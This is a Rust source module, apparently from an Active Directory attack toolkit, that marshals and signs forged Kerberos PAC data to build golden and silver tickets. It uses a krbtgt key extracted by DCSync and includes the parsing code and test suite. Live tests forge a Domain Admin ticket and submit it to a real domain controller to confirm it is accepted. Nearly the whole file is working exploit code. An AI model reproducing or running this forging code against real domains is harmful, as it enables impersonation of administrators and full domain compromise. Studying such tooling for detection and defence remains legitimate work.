//! PAC (MS-PAC) marshaling for Kerberos ticket forging (golden / silver tickets).
//!
//! A forged TGT/TGS carries a Privilege Attribute Certificate in its EncTicketPart
//! authorization-data. This module (a) decrypts and dissects a *real* ticket's PAC — the
//! byte-oracle that proves our extracted krbtgt key and shows exactly which buffers a
//! Server 2025 KDC emits — and (b) marshals a forged PAC (KERB_VALIDATION_INFO + the two
//! signatures + PAC_CLIENT_INFO + PAC_REQUESTOR/PAC_ATTRIBUTES for KB5020805 enforcement).

use crate::Tgt;
use anyhow::{anyhow, bail, Result};
use picky_asn1::wrapper::ExplicitContextTag10;
use picky_asn1_der::application_tag::ApplicationTag;
use picky_krb::crypto::{ChecksumSuite, CipherSuite};
use picky_krb::data_types::{AuthorizationData, EncTicketPart};

// ---------------------------------------------------------------------------
// Small little-endian NDR byte-builder (Type Serialization v1, 4-byte aligned).
// ---------------------------------------------------------------------------
#[derive(Default)]
struct Nd {
    b: Vec<u8>,
}
impl Nd {
    fn u8(&mut self, v: u8) {
        self.b.push(v);
    }
    fn u16(&mut self, v: u16) {
        self.b.extend_from_slice(&v.to_le_bytes());
    }
    fn u32(&mut self, v: u32) {
        self.b.extend_from_slice(&v.to_le_bytes());
    }
    fn u64(&mut self, v: u64) {
        self.b.extend_from_slice(&v.to_le_bytes());
    }
    fn bytes(&mut self, v: &[u8]) {
        self.b.extend_from_slice(v);
    }
    fn align(&mut self, n: usize) {
        while !self.b.len().is_multiple_of(n) {
            self.b.push(0);
        }
    }
    /// RPC_UNICODE_STRING fixed part: Length, MaxLength (bytes), Buffer referent.
    fn rpc_unicode_hdr(&mut self, nchars: usize, referent: u32) {
        self.u16((nchars * 2) as u16);
        self.u16((nchars * 2) as u16);
        self.u32(referent);
    }
    /// Conformant+varying wide-char array (the deferred buffer of an RPC_UNICODE_STRING).
    fn cv_wstr(&mut self, s: &str) {
        let units: Vec<u16> = s.encode_utf16().collect();
        self.align(4);
        self.u32(units.len() as u32); // MaxCount
        self.u32(0); // Offset
        self.u32(units.len() as u32); // ActualCount
        for u in units {
            self.u16(u);
        }
    }
}

/// FILETIME (100ns ticks since 1601-01-01) for "now".
fn filetime_now() -> u64 {
    use std::time::{SystemTime, UNIX_EPOCH};
    let secs = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .map(|d| d.as_secs())
        .unwrap_or(0);
    // 11644473600 s between 1601 and 1970; ticks are 100ns.
    (secs + 11_644_473_600) * 10_000_000
}

const FT_INFINITY: u64 = 0x7fff_ffff_ffff_ffff;

/// Parameters for a forged PAC / ticket.
pub struct ForgeIdentity {
    pub user: String,
    pub rid: u32,
    pub primary_gid: u32,
    pub group_rids: Vec<u32>,
    /// Domain SID sub-authorities after S-1-5 (i.e. `[21, a, b, c]`).
    pub domain_subauths: Vec<u32>,
    pub logon_server: String,
    pub logon_domain: String,
}

impl ForgeIdentity {
    /// The full requestor SID bytes (domain SID + rid) for PAC_REQUESTOR.
    fn requestor_sid(&self) -> Vec<u8> {
        let mut subs = self.domain_subauths.clone();
        subs.push(self.rid);
        sid_bytes(&subs)
    }
}

/// Plain (non-NDR) SID: Revision, SubAuthCount, IdentifierAuthority(=5, 6 BE bytes), sub-authorities.
fn sid_bytes(subauths: &[u32]) -> Vec<u8> {
    let mut v = vec![1u8, subauths.len() as u8, 0, 0, 0, 0, 0, 5];
    for s in subauths {
        v.extend_from_slice(&s.to_le_bytes());
    }
    v
}

/// NDR RPC_SID (conformant): [ElementCount = SubAuthorityCount], then the plain SID.
fn ndr_sid(nd: &mut Nd, subauths: &[u32]) {
    nd.align(4);
    nd.u32(subauths.len() as u32); // conformant element count
    nd.u8(1); // Revision
    nd.u8(subauths.len() as u8); // SubAuthorityCount
    nd.bytes(&[0, 0, 0, 0, 0, 5]); // IdentifierAuthority = 5 (BE)
    for s in subauths {
        nd.u32(*s);
    }
}

/// Marshal KERB_VALIDATION_INFO (LOGON_INFO buffer content) as NDR Type Serialization v1,
/// reproducing the exact field/pointer/deferral layout a Windows KDC emits (validated
/// byte-for-byte against a live Server 2025 PAC).
pub fn build_kerb_validation_info(id: &ForgeIdentity) -> Vec<u8> {
    let now = filetime_now();
    let mut ref_id = 0x0002_0004u32;
    let mut next_ref = || {
        let r = ref_id;
        ref_id += 4;
        r
    };

    // Referents, assigned in fixed-part pointer order.
    let eff_ref = next_ref();
    let full_ref = next_ref();
    let script_ref = next_ref();
    let profile_ref = next_ref();
    let home_ref = next_ref();
    let homedrive_ref = next_ref();
    let groups_ref = next_ref();
    let logonsrv_ref = next_ref();
    let logondom_ref = next_ref();
    let domainid_ref = next_ref();

    let mut f = Nd::default();
    // 6 FILETIMEs.
    f.u64(now); // LogonTime
    f.u64(FT_INFINITY); // LogoffTime
    f.u64(FT_INFINITY); // KickOffTime
    f.u64(now); // PasswordLastSet
    f.u64(now); // PasswordCanChange
    f.u64(FT_INFINITY); // PasswordMustChange
    f.rpc_unicode_hdr(id.user.encode_utf16().count(), eff_ref); // EffectiveName
    f.rpc_unicode_hdr(0, full_ref); // FullName
    f.rpc_unicode_hdr(0, script_ref); // LogonScript
    f.rpc_unicode_hdr(0, profile_ref); // ProfilePath
    f.rpc_unicode_hdr(0, home_ref); // HomeDirectory
    f.rpc_unicode_hdr(0, homedrive_ref); // HomeDirectoryDrive
    f.u16(0); // LogonCount
    f.u16(0); // BadPasswordCount
    f.u32(id.rid); // UserId
    f.u32(id.primary_gid); // PrimaryGroupId
    f.u32(id.group_rids.len() as u32); // GroupCount
    f.u32(groups_ref); // GroupIds ptr
    f.u32(0x0000_0020); // UserFlags (LOGON_EXTRA_SIDS-ish; matches live)
    f.bytes(&[0u8; 16]); // UserSessionKey
    f.rpc_unicode_hdr(id.logon_server.encode_utf16().count(), logonsrv_ref);
    f.rpc_unicode_hdr(id.logon_domain.encode_utf16().count(), logondom_ref);
    f.u32(domainid_ref); // LogonDomainId ptr
    f.bytes(&[0u8; 8]); // LMKey
    f.u32(0x0000_0200); // UserAccountControl = NORMAL_ACCOUNT
    f.u32(0); // SubAuthStatus
    f.u64(0); // LastSuccessfulILogon
    f.u64(0); // LastFailedILogon
    f.u32(0); // FailedILogonCount
    f.u32(0); // Reserved3
    f.u32(0); // SidCount
    f.u32(0); // ExtraSids ptr (null)
    f.u32(0); // ResourceGroupDomainSid ptr (null)
    f.u32(0); // ResourceGroupCount
    f.u32(0); // ResourceGroupIds ptr (null)

    // Deferred region, in pointer order.
    f.cv_wstr(&id.user); // EffectiveName buffer
    for _ in 0..5 {
        f.cv_wstr(""); // Full/Script/Profile/Home/HomeDrive buffers (empty)
    }
    f.align(4); // GroupIds array
    f.u32(id.group_rids.len() as u32); // MaxCount
    for rid in &id.group_rids {
        f.u32(*rid); // RelativeId
        f.u32(0x0000_0007); // Attributes (MANDATORY|ENABLED_BY_DEFAULT|ENABLED)
    }
    f.cv_wstr(&id.logon_server); // LogonServer buffer
    f.cv_wstr(&id.logon_domain); // LogonDomainName buffer
    ndr_sid(&mut f, &id.domain_subauths); // LogonDomainId SID

    // Type Serialization v1 wrapper. MS pads the whole buffer (incl. the 16-byte header) to an
    // 8-byte boundary; ObjectBufferLength then counts the root referent + body + that pad.
    let body = f.b;
    let mut out = Nd::default();
    out.bytes(&[0x01, 0x10, 0x08, 0x00, 0xcc, 0xcc, 0xcc, 0xcc]); // common header
    out.u32(0); // ObjectBufferLength (patched below)
    out.u32(0); // filler
    out.u32(0x0002_0000); // root referent
    out.bytes(&body);
    while out.b.len() % 8 != 0 {
        out.u8(0);
    }
    let obl = (out.b.len() - 16) as u32;
    out.b[8..12].copy_from_slice(&obl.to_le_bytes());
    out.b
}

/// PAC_CLIENT_INFO (MS-PAC 2.7): ClientId(FILETIME), NameLength, Name(UTF-16, no NDR).
pub fn build_client_info(user: &str) -> Vec<u8> {
    let name: Vec<u16> = user.encode_utf16().collect();
    let mut nd = Nd::default();
    nd.u64(filetime_now()); // ClientId (authtime)
    nd.u16((name.len() * 2) as u16); // NameLength (bytes)
    for u in name {
        nd.u16(u);
    }
    nd.b
}

/// PAC_ATTRIBUTES_INFO (MS-PAC 2.14): FlagsLength(bits), Flags.
pub fn build_attributes() -> Vec<u8> {
    let mut nd = Nd::default();
    nd.u32(2); // FlagsLength (2 bits)
    nd.u32(1); // PAC_WAS_REQUESTED
    nd.b
}

/// PAC_REQUESTOR (MS-PAC 2.15): the requestor's SID (plain, non-NDR).
pub fn build_requestor(id: &ForgeIdentity) -> Vec<u8> {
    id.requestor_sid()
}

/// SignatureType for the checksum buffers when signing with an AES256 key.
const SIG_HMAC_SHA1_96_AES256: i32 = 16;
const KERB_NON_KERB_CKSUM_SALT: i32 = 17;

fn aes256_checksum(key: &[u8], payload: &[u8]) -> Result<Vec<u8>> {
    ChecksumSuite::HmacSha196Aes256
        .hasher()
        .checksum(key, KERB_NON_KERB_CKSUM_SALT, payload)
        .map_err(|e| anyhow!("PAC checksum: {e}"))
}

/// Assemble a signed PACTYPE from the forged buffers. `server_key` signs the whole PAC
/// (SERVER_CHECKSUM); `kdc_key` signs the server signature (KDC_CHECKSUM). For a golden TGT
/// both are the krbtgt key; for a silver ticket the server key is the service account's. `rc4`
/// selects the KERB_CHECKSUM_HMAC_MD5 (type -138) signatures for RC4 keys instead of the AES
/// HMAC-SHA1-96 (type 16) ones.
pub fn assemble_pac(
    id: &ForgeIdentity,
    server_key: &[u8],
    kdc_key: &[u8],
    rc4: bool,
) -> Result<Vec<u8>> {
    // Checksum + signature shape depends on the key type.
    let sign = |key: &[u8], data: &[u8]| -> Result<Vec<u8>> {
        if rc4 {
            Ok(crate::rc4::hmac_md5_checksum(key, KERB_NON_KERB_CKSUM_SALT, data).to_vec())
        } else {
            aes256_checksum(key, data)
        }
    };
    // Signature buffers start zeroed: SignatureType(i32) + HMAC placeholder (16 for MD5, 12 for AES).
    let mut sig_buf = Nd::default();
    if rc4 {
        sig_buf.u32(crate::rc4::SIG_HMAC_MD5 as u32);
        sig_buf.bytes(&[0u8; 16]);
    } else {
        sig_buf.u32(SIG_HMAC_SHA1_96_AES256 as u32);
        sig_buf.bytes(&[0u8; 12]);
    }
    let sig_template = sig_buf.b;

    // (ulType, data) in emission order.
    let buffers: Vec<(u32, Vec<u8>)> = vec![
        (PAC_LOGON_INFO, build_kerb_validation_info(id)),
        (PAC_CLIENT_INFO_TYPE, build_client_info(&id.user)),
        (PAC_ATTRIBUTES_INFO, build_attributes()),
        (PAC_REQUESTOR, build_requestor(id)),
        (PAC_SERVER_CHECKSUM, sig_template.clone()),
        (PAC_KDC_CHECKSUM, sig_template.clone()),
    ];

    // Layout: header(8) + N*16 descriptors, then 8-aligned data blocks.
    let n = buffers.len();
    let mut data_off = 8 + n * 16;
    let mut descriptors = Nd::default();
    descriptors.u32(n as u32);
    descriptors.u32(0); // Version
    let mut blocks: Vec<(usize, usize)> = Vec::new(); // (offset, len) per buffer
    let mut data = Vec::new();
    for (t, d) in &buffers {
        descriptors.u32(*t);
        descriptors.u32(d.len() as u32);
        descriptors.u64(data_off as u64);
        blocks.push((data_off, d.len()));
        data.extend_from_slice(d);
        while data.len() % 8 != 0 {
            data.push(0); // 8-byte-align next element
        }
        data_off = 8 + n * 16 + data.len();
    }
    let mut pac = descriptors.b;
    pac.extend_from_slice(&data);

    // Server checksum over the whole PAC (both signatures still zeroed).
    let server_sig = sign(server_key, &pac)?;
    let (srv_off, _) = blocks[4];
    pac[srv_off + 4..srv_off + 4 + server_sig.len()].copy_from_slice(&server_sig);

    // KDC checksum over the server signature bytes only.
    let kdc_sig = sign(kdc_key, &server_sig)?;
    let (kdc_off, _) = blocks[5];
    pac[kdc_off + 4..kdc_off + 4 + kdc_sig.len()].copy_from_slice(&kdc_sig);

    Ok(pac)
}

/// EncTicketPart is `[APPLICATION 3] SEQUENCE` on the wire.
type EncTicketPartApp = ApplicationTag<EncTicketPart, 3>;

/// key usage 2 — EncTicketPart sealed under the server (here krbtgt) key.
const KEY_USAGE_TICKET: i32 = 2;

/// PAC_INFO_BUFFER ulType values (MS-PAC 2.4) we care about.
pub const PAC_LOGON_INFO: u32 = 1;
pub const PAC_SERVER_CHECKSUM: u32 = 6;
pub const PAC_KDC_CHECKSUM: u32 = 7;
pub const PAC_CLIENT_INFO_TYPE: u32 = 10;
pub const PAC_TICKET_CHECKSUM: u32 = 16;
pub const PAC_ATTRIBUTES_INFO: u32 = 17;
pub const PAC_REQUESTOR: u32 = 18;

/// One parsed PAC buffer (type + raw payload).
#[derive(Debug, Clone)]
pub struct PacBuf {
    pub ul_type: u32,
    pub data: Vec<u8>,
}

/// A dissected PACTYPE container.
#[derive(Debug, Clone)]
pub struct ParsedPac {
    pub buffers: Vec<PacBuf>,
}

impl ParsedPac {
    pub fn get(&self, ul_type: u32) -> Option<&PacBuf> {
        self.buffers.iter().find(|b| b.ul_type == ul_type)
    }
}

/// Parse a PACTYPE container (MS-PAC 2.3): cBuffers, Version=0, then cBuffers ×
/// PAC_INFO_BUFFER{ulType, cbBufferSize, Offset(from PAC start)}.
pub fn parse_pac(pac: &[u8]) -> Result<ParsedPac> {
    if pac.len() < 8 {
        bail!("PAC too short");
    }
    let c_buffers = u32::from_le_bytes(pac[0..4].try_into().unwrap()) as usize;
    let version = u32::from_le_bytes(pac[4..8].try_into().unwrap());
    if version != 0 {
        bail!("PAC version {version} != 0");
    }
    let mut buffers = Vec::with_capacity(c_buffers);
    for i in 0..c_buffers {
        let base = 8 + i * 16;
        let hdr = pac
            .get(base..base + 16)
            .ok_or_else(|| anyhow!("truncated PAC_INFO_BUFFER {i}"))?;
        let ul_type = u32::from_le_bytes(hdr[0..4].try_into().unwrap());
        let size = u32::from_le_bytes(hdr[4..8].try_into().unwrap()) as usize;
        let offset = u64::from_le_bytes(hdr[8..16].try_into().unwrap()) as usize;
        let data = pac
            .get(offset..offset + size)
            .ok_or_else(|| anyhow!("PAC buffer {i} range {offset}+{size} out of bounds"))?
            .to_vec();
        buffers.push(PacBuf { ul_type, data });
    }
    Ok(ParsedPac { buffers })
}

/// Human name for a PAC buffer type (for the analysis dump).
pub fn buf_name(t: u32) -> &'static str {
    match t {
        1 => "LOGON_INFO (KERB_VALIDATION_INFO)",
        2 => "CREDENTIALS",
        6 => "SERVER_CHECKSUM",
        7 => "KDC_CHECKSUM",
        10 => "CLIENT_INFO",
        12 => "UPN_DNS_INFO",
        16 => "TICKET_CHECKSUM",
        17 => "ATTRIBUTES_INFO",
        18 => "REQUESTOR",
        _ => "?",
    }
}

/// Pull the PAC bytes out of an EncTicketPart's authorization-data:
/// AD-IF-RELEVANT (type 1) → inner AuthorizationData → AD-WIN2K-PAC (type 128).
pub fn extract_pac(auth: &ExplicitContextTag10<AuthorizationData>) -> Result<Vec<u8>> {
    // DER-encoded signed integer bytes → value (ad_type is small: 1 and 128 here).
    let val = |b: &[u8]| b.iter().fold(0i64, |a, &x| (a << 8) | x as i64);
    for outer in &auth.0 .0 {
        // ad_type 1 = AD-IF-RELEVANT: ad_data is a nested AuthorizationData DER.
        if val(&outer.ad_type.0 .0) == 1 {
            let inner: AuthorizationData = picky_asn1_der::from_bytes(&outer.ad_data.0 .0)
                .map_err(|e| anyhow!("decode AD-IF-RELEVANT: {e}"))?;
            for e in &inner.0 {
                if val(&e.ad_type.0 .0) == 128 {
                    // 128 = AD-WIN2K-PAC
                    return Ok(e.ad_data.0 .0.clone());
                }
            }
        }
    }
    bail!("no AD-WIN2K-PAC in ticket authorization-data")
}

/// Decrypt a real TGT's EncTicketPart with the krbtgt AES256 key and return
/// (the parsed enc-ticket-part, the raw PAC bytes). Doubles as a live proof that the
/// DCSync-extracted krbtgt key is correct: AES decryption is integrity-protected, so a
/// wrong key fails here rather than yielding garbage.
pub fn decrypt_ticket_pac(tgt: &Tgt, krbtgt_aes256: &[u8]) -> Result<(EncTicketPart, Vec<u8>)> {
    let cipher = CipherSuite::Aes256CtsHmacSha196.cipher();
    let plain = cipher
        .decrypt(krbtgt_aes256, KEY_USAGE_TICKET, tgt.ticket_cipher())
        .map_err(|e| anyhow!("decrypt EncTicketPart with krbtgt key (wrong key?): {e}"))?;
    let etp: EncTicketPart = picky_asn1_der::from_bytes::<EncTicketPartApp>(&plain)
        .map_err(|e| anyhow!("decode EncTicketPart: {e}"))?
        .0;
    let auth = etp
        .authorization_data
        .0
        .as_ref()
        .ok_or_else(|| anyhow!("ticket has no authorization-data (no PAC)"))?;
    let pac = extract_pac(auth)?;
    Ok((etp, pac))
}

#[cfg(test)]
mod offline {
    use super::*;

    fn sample() -> ForgeIdentity {
        ForgeIdentity {
            user: "Administrator".into(),
            rid: 500,
            primary_gid: 513,
            group_rids: vec![513, 512, 520, 518, 519],
            domain_subauths: vec![21, 1111111111, 2222222222, 3333333333], // synthetic S-1-5-21-…
            logon_server: "DC01".into(),
            logon_domain: "CORP".into(),
        }
    }

    /// KERB_VALIDATION_INFO must reproduce the exact wire layout a Windows KDC emits: TypeSer v1
    /// header, 216-byte fixed part, deferred region ending 8-aligned, ObjectBufferLength correct.
    #[test]
    fn logon_info_layout() {
        let li = build_kerb_validation_info(&sample());
        // header 01 10 08 00 cccccccc + ObjectBufferLength(=body+4) + 0 + root referent 00020000
        assert_eq!(&li[0..8], &[0x01, 0x10, 0x08, 0x00, 0xcc, 0xcc, 0xcc, 0xcc]);
        let obl = u32::from_le_bytes(li[8..12].try_into().unwrap()) as usize;
        assert_eq!(&li[16..20], &[0x00, 0x00, 0x02, 0x00]); // root referent
        assert_eq!(obl, li.len() - 16); // ObjectBufferLength counts referent + body
        assert_eq!(li.len() % 8, 0);
        // UserId sits at a known offset in the fixed part (after 6 FILETIMEs + 6 RPC_UNICODE + 2 u16).
        // 20 (body start) + 48 (filetimes) + 48 (strings) + 4 (counts) = 120.
        let uid = u32::from_le_bytes(li[120..124].try_into().unwrap());
        assert_eq!(uid, 500);
        let pgid = u32::from_le_bytes(li[124..128].try_into().unwrap());
        assert_eq!(pgid, 513);
    }

    /// assemble_pac must produce a parseable 6-buffer container whose SERVER_CHECKSUM is a valid
    /// HMAC over the zeroed-signature PAC and whose KDC_CHECKSUM signs the server signature.
    #[test]
    fn pac_container_and_signatures() {
        let key = [0x42u8; 32];
        let pac = assemble_pac(&sample(), &key, &key, false).unwrap();
        let parsed = parse_pac(&pac).unwrap();
        for t in [
            PAC_LOGON_INFO,
            PAC_CLIENT_INFO_TYPE,
            PAC_ATTRIBUTES_INFO,
            PAC_REQUESTOR,
            PAC_SERVER_CHECKSUM,
            PAC_KDC_CHECKSUM,
        ] {
            assert!(parsed.get(t).is_some(), "missing buffer {t}");
        }
        // Recompute the server checksum: zero both signatures in a fresh copy, HMAC, compare.
        let srv = parsed.get(PAC_SERVER_CHECKSUM).unwrap();
        let stored_srv_sig = srv.data[4..16].to_vec();
        let mut zeroed = pac.clone();
        // find each checksum buffer's data offset and zero its 12-sig bytes
        for i in 0..parsed.buffers.len() {
            let base = 8 + i * 16;
            let t = u32::from_le_bytes(zeroed[base..base + 4].try_into().unwrap());
            let off = u64::from_le_bytes(zeroed[base + 8..base + 16].try_into().unwrap()) as usize;
            if t == PAC_SERVER_CHECKSUM || t == PAC_KDC_CHECKSUM {
                for b in zeroed[off + 4..off + 16].iter_mut() {
                    *b = 0;
                }
            }
        }
        let recomputed = aes256_checksum(&key, &zeroed).unwrap();
        assert_eq!(recomputed, stored_srv_sig, "server checksum mismatch");
        let kdc = parsed.get(PAC_KDC_CHECKSUM).unwrap();
        let recomputed_kdc = aes256_checksum(&key, &stored_srv_sig).unwrap();
        assert_eq!(recomputed_kdc, kdc.data[4..16], "kdc checksum mismatch");
    }

    /// A forged silver ticket must round-trip: seal under a service key, then decrypt the
    /// EncTicketPart back with that key (AES integrity holds) and recover a parseable PAC whose
    /// LOGON_INFO carries the forged identity.
    #[test]
    fn silver_ticket_roundtrips() {
        let key = [0x37u8; 32];
        let tgt =
            crate::forge_silver_tgt(&sample(), "CORP.LOCAL", &key, "cifs/dc01.corp.local", false)
                .unwrap();
        let (_etp, pac) = decrypt_ticket_pac(&tgt, &key).expect("decrypt silver");
        let parsed = parse_pac(&pac).unwrap();
        let li = &parsed.get(PAC_LOGON_INFO).unwrap().data;
        // UserId at fixed offset 120 in the LOGON_INFO buffer.
        assert_eq!(u32::from_le_bytes(li[120..124].try_into().unwrap()), 500);
        assert!(parsed.get(PAC_SERVER_CHECKSUM).is_some());
    }

    /// RC4 golden ticket: forge under an NT-hash krbtgt key, then decrypt the EncTicketPart back
    /// with RC4-HMAC (usage 2), recover the PAC, and confirm the SERVER_CHECKSUM is a valid
    /// KERB_CHECKSUM_HMAC_MD5 (type -138) over the zeroed-signature PAC. Proves the RC4 forge +
    /// HMAC-MD5 PAC signing are byte-correct, independent of any KDC etype policy.
    #[test]
    fn rc4_golden_roundtrips() {
        let nt = crate::rc4::nt_hash("Krbtgt-NT-Hash!");
        let tgt = crate::forge_golden_tgt(&sample(), "CORP.LOCAL", &nt, true).unwrap();
        let plain = crate::rc4::decrypt(&nt, 2, tgt.ticket_cipher()).expect("rc4 decrypt ticket");
        let etp: EncTicketPart = picky_asn1_der::from_bytes::<EncTicketPartApp>(&plain)
            .expect("EncTicketPart decode")
            .0;
        let auth = etp.authorization_data.0.as_ref().expect("has auth-data");
        let pac = extract_pac(auth).expect("extract PAC");
        let parsed = parse_pac(&pac).unwrap();
        let srv = parsed.get(PAC_SERVER_CHECKSUM).unwrap();
        // SignatureType must be -138 (HMAC-MD5), signature 16 bytes.
        assert_eq!(
            i32::from_le_bytes(srv.data[0..4].try_into().unwrap()),
            crate::rc4::SIG_HMAC_MD5
        );
        assert_eq!(srv.data.len(), 4 + 16);
        // Recompute the server checksum over the PAC with both signatures zeroed.
        let stored = srv.data[4..20].to_vec();
        let mut zeroed = pac.clone();
        for i in 0..parsed.buffers.len() {
            let base = 8 + i * 16;
            let t = u32::from_le_bytes(zeroed[base..base + 4].try_into().unwrap());
            let off = u64::from_le_bytes(zeroed[base + 8..base + 16].try_into().unwrap()) as usize;
            if t == PAC_SERVER_CHECKSUM || t == PAC_KDC_CHECKSUM {
                for b in zeroed[off + 4..off + 20].iter_mut() {
                    *b = 0;
                }
            }
        }
        assert_eq!(
            crate::rc4::hmac_md5_checksum(&nt, 17, &zeroed).to_vec(),
            stored,
            "RC4 golden SERVER_CHECKSUM (HMAC-MD5) mismatch"
        );
    }

    #[test]
    fn requestor_sid_appends_rid() {
        let id = sample();
        let sid = id.requestor_sid();
        // last 4 bytes = RID 500 little-endian
        assert_eq!(&sid[sid.len() - 4..], &500u32.to_le_bytes());
        assert_eq!(sid[0], 1); // revision
        assert_eq!(sid[1], 5); // 5 sub-authorities (21,a,b,c,rid)
    }
}

#[cfg(test)]
mod live {
    use super::*;

    /// Live oracle: get recon's real TGT, decrypt its EncTicketPart with the DCSync-extracted
    /// krbtgt AES256 key, and dump the PAC buffer layout. Proves the krbtgt key AND captures the
    /// authoritative Server 2025 PAC shape for the forger.
    /// Env: ADH_KDC, ADH_REALM, ADH_KRBTGT_AES256 (64 hex), ADH_USER/ADH_PASS.
    #[tokio::test]
    #[ignore = "live DC"]
    async fn decrypt_real_pac() {
        let Ok(kdc) = std::env::var("ADH_KDC") else {
            return;
        };
        let realm = std::env::var("ADH_REALM").unwrap_or_else(|_| "CORP.LOCAL".into());
        let user = std::env::var("ADH_USER").unwrap_or_else(|_| "lowpriv".into());
        let pass = std::env::var("ADH_PASS").unwrap_or_default();
        let key = hex::decode(std::env::var("ADH_KRBTGT_AES256").expect("ADH_KRBTGT_AES256"))
            .expect("hex");

        let tgt = crate::get_tgt(&user, &pass, &realm, &kdc)
            .await
            .expect("get_tgt");
        let (etp, pac) = decrypt_ticket_pac(&tgt, &key).expect("decrypt PAC");
        let parsed = parse_pac(&pac).expect("parse PAC");
        eprintln!(
            "[pac] {} bytes, flags={:02x?}, {} buffers:",
            pac.len(),
            etp.flags.0.as_bytes(),
            parsed.buffers.len()
        );
        for b in &parsed.buffers {
            eprintln!(
                "  type={:2} {:32} {} bytes  {}",
                b.ul_type,
                buf_name(b.ul_type),
                b.data.len(),
                hex::encode(&b.data[..b.data.len().min(48)])
            );
        }
        if std::env::var("ADH_DUMP_LOGON").is_ok() {
            let li = parsed.get(PAC_LOGON_INFO).unwrap();
            eprintln!("[logon_info_full] {}", hex::encode(&li.data));
        }
        // must at least carry LOGON_INFO + both checksums
        assert!(parsed.get(PAC_LOGON_INFO).is_some());
        assert!(parsed.get(PAC_SERVER_CHECKSUM).is_some());
        assert!(parsed.get(PAC_KDC_CHECKSUM).is_some());
    }

    /// Forge a Domain-Admin golden ticket with the DCSync-extracted krbtgt AES256 key and PROVE
    /// the KDC accepts it: submit the forged TGT in a TGS-REQ (PA-TGS-REQ), which forces the KDC
    /// to decrypt the ticket and validate the PAC's KDC signature under full KB5020805 enforcement.
    /// A TGS-REP back = the golden ticket (marshaling + both signatures + requestor) is valid.
    /// Env: ADH_KDC, ADH_REALM, ADH_KRBTGT_AES256, ADH_DOMAIN_SID (S-1-5-21-a-b-c), ADH_SPN.
    #[tokio::test]
    #[ignore = "live DC"]
    async fn golden_ticket_accepted() {
        let Ok(kdc) = std::env::var("ADH_KDC") else {
            return;
        };
        let realm = std::env::var("ADH_REALM").unwrap_or_else(|_| "CORP.LOCAL".into());
        let key = hex::decode(std::env::var("ADH_KRBTGT_AES256").expect("ADH_KRBTGT_AES256"))
            .expect("hex");
        // Domain SID sub-authorities: "S-1-5-21-a-b-c" → [21,a,b,c].
        let dsid = std::env::var("ADH_DOMAIN_SID").expect("ADH_DOMAIN_SID");
        let subs: Vec<u32> = dsid
            .trim_start_matches("S-1-5-")
            .split('-')
            .map(|x| x.parse().unwrap())
            .collect();
        let spn = std::env::var("ADH_SPN")
            .unwrap_or_else(|_| format!("cifs/dc01.{}", realm.to_lowercase()));

        let id = ForgeIdentity {
            user: "Administrator".into(),
            rid: 500,
            primary_gid: 513,
            group_rids: vec![513, 512, 520, 518, 519], // Users, Domain/Schema/Enterprise Admins, GPO Creators
            domain_subauths: subs,
            logon_server: "DC01".into(),
            logon_domain: realm.split('.').next().unwrap_or("CORP").to_uppercase(),
        };
        let tgt = crate::forge_golden_tgt(&id, &realm, &key, false).expect("forge golden");
        let hash = crate::roast_spn(&tgt, "Administrator", &spn, &kdc)
            .await
            .expect("KDC must accept the golden ticket (TGS-REP for the SPN)");
        eprintln!("[golden] KDC accepted forged DA TGT → service ticket for {spn}");
        assert!(hash.contains("$krb5tgs$") || !hash.is_empty());
    }
}
